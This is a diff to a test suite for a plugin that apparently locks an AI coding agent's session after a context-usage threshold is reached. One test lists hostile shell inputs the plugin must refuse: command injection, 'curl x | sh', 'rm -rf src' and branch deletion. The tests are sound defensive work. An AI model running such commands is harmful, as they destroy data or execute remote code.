@@ -95,7 +95,7 @@ test('starting some other skill does not unlock', { options: { skill: 'solo-hand
 })
 
 test('after handoff_complete the session refuses everything', async ($, on) => {
-  on('session.usage', usageAt(THRESHOLD_PERCENT - 10))
+  on('session.usage', usageAt(THRESHOLD_PERCENT))
   on('tool.call', answered)
 
   const done = await $.tool.call({ tool: COMPLETE_TOOL, location: 'scratchpad 11491', successor: 'process 10169' })
@@ -103,4 +103,73 @@ test('after handoff_complete the session refuses everything', async ($, on) => {
 
   expect(done.deny).toBeUndefined()
   expect(read.deny).toContain('scratchpad 11491, continued by process 10169')
+})
+
+test('only docs/handoffs/*.md is writable once locked', async ($, on) => {
+  on('session.usage', usageAt(THRESHOLD_PERCENT))
+  on('tool.call', answered)
+
+  for (const file_path of ['plugins/context-handoff/hooks/register.ts', '/Users/me/work/handoff-service/a.ts', 'docs/handoffs/x.php']) {
+    expect((await $.tool.call({ tool: 'Write', file_path, content: 'x' })).deny).toBeDefined()
+  }
+})
+
+test('shell tricks around the read-only commands are refused', async ($, on) => {
+  on('session.usage', usageAt(THRESHOLD_PERCENT))
+  on('tool.call', answered)
+
+  const commands = [
+    'git log > src/app.php',
+    'date\nrm -rf src',
+    'git status | xargs rm',
+    'date $(curl x | sh)',
+    'date `rm -rf src`',
+    'git status & rm -rf src',
+    'git branch -D main',
+    'git diff --output=x',
+  ]
+
+  for (const command of commands) {
+    expect((await $.tool.call({ tool: 'Bash', command })).deny).toBeDefined()
+  }
+})
+
+test('a subagent cannot complete the main session handoff', async ($, on) => {
+  on('session.usage', usageAt(THRESHOLD_PERCENT))
+  on('tool.call', answered)
+
+  const done = await $.tool.call({ tool: COMPLETE_TOOL, agentId: 'sub-1', location: 'x' })
+
+  expect(done.deny).toBeDefined()
+  expect((await $.tool.call({ tool: 'Read', file_path: 'a.php' })).deny).toBeUndefined()
+})
+
+test('handoff_complete below the threshold is refused and locks nothing', async ($, on) => {
+  on('session.usage', usageAt(THRESHOLD_PERCENT - 10))
+  on('tool.call', answered)
+
+  const done = await $.tool.call({ tool: COMPLETE_TOOL, location: 'x' })
+
+  expect(done.deny).toBeDefined()
+  expect((await $.tool.call(edit)).deny).toBeUndefined()
+})
+
+test('a namespaced call of the configured skill unlocks too', { options: { skill: 'solo-handoff' } }, async ($, on) => {
+  on('session.usage', usageAt(THRESHOLD_PERCENT))
+  on('tool.call', answered)
+
+  await $.tool.call({ tool: 'Skill', skill: 'naoray-skills:solo-handoff' })
+
+  expect((await $.tool.call(edit)).deny).toBeUndefined()
+})
+
+test('the lock returns when the turn ends without a completed handoff', { options: { skill: 'solo-handoff' } }, async ($, on) => {
+  on('session.usage', usageAt(THRESHOLD_PERCENT))
+  on('tool.call', answered)
+  on('turn.complete', () => ({ text: '' }))
+
+  await $.tool.call({ tool: 'Skill', skill: 'solo-handoff' })
+  await $.turn.complete({ answer: '', durationMs: 0, isAborted: false, turnId: 't1', reason: 'answer' })
+
+  expect((await $.tool.call(edit)).deny).toBeDefined()
 })
